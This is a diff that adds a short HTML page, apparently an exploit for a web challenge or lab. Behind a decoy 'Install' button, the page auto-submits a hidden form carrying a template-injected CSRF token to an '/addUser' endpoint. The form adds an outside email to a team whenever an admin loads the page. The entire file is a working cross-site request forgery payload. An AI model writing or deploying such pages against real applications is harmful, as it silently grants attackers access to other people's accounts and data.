@@ -1,0 +1,12 @@
+<html>
+  <body>
+    <form id="csrf" method="POST" action="/api/teams/1/addUser/blhd3hfy48@bltiwd.com">
+      <input type="hidden" name="csrfToken" id="token" />
+    </form>
+    <script>
+      document.getElementById("token").value = "<%= csrfToken %>"; // rendered by EJS on admin visit
+      setTimeout(() => document.getElementById("csrf").submit(), 500);
+    </script>
+    <button id="installbutton">Install</button>
+  </body>
+</html>
